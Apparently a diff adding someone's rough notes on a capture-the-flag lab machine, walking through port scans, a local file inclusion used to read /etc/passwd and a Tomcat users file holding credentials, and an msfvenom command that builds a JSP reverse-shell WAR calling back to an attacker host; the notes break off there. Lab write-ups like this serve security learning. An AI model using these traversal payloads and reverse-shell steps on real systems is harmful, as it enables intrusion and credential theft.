@@ -1,0 +1,58 @@
+Ping to check its active or not
+----------------------------------------------
+nmap -sC -sV  10.10.10.194
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Mega Hosting
+8080/tcp open  http    Apache Tomcat
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Apache Tomcat
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+------------------------------------------------
+Visiting the web page
+http://www.megahosting.htb/news.php?file=statement
+was found maybe sql vulnerable 
+checking sqlmap
+does not seem injectable
+visiting 10.10.10.194/news.php?file=statement
+to show a page that says sorry for the data breach and the tool has been removed
+------------------------------------------------ 
+Running nikto and dirb
+nikto -h http://10.10.10.194/
+dirb http://10.10.10.194/
+---- Scanning URL: http://10.10.10.194/ ----
+==> DIRECTORY: http://10.10.10.194/assets/                                     
++ http://10.10.10.194/favicon.ico (CODE:200|SIZE:766)                          
+==> DIRECTORY: http://10.10.10.194/files/                                      
++ http://10.10.10.194/index.php (CODE:200|SIZE:14175)                          
++ http://10.10.10.194/server-status (CODE:403|SIZE:277
+Didnt find anything useful
+------------------------------------------
+Maybe tomcat is exploitable
+https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/
+There is Tomcat Manager Authenticated Upload Code Execution
+need credentials for that.
+tried to brute force it with a msf module with common tomcat usernames and passwords
+didnt work
+need to find a valid username and password0
+---------------------------
+After some googling I came across LFI Local File Inclusion
+https://www.youtube.com/watch?v=kcojXEwolIs
+10.10.10.194/news.php?file=../../../../etc/passwd
+displayed the passwd file it is lfi exploitable
+https://highon.coffee/blog/lfi-cheat-sheet/
+Since it is exploitable I'll try to get a shell
+Doesnt seem possible instead trying to find credentials for tomcat
+10.10.10.194/news.php?file=../../../../etc/passwd
+gave me the tomcat 
+../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml in burp repeater gave me the file with the credentials
+  <role rolename="admin-gui"/>
+   <role rolename="manager-script"/>
+   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
+</tomcat-users>
+----------------------------------------------
+The msf tomcat doesnt work becuase the /manger isnt working with our credentials
+------------------------------------------
+curl -u tomcat:$3cureP4s5w0rd123! http://10.10.10.194:8080/host-manager/text/list
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.19 LPORT=4444 -f war > shell.war
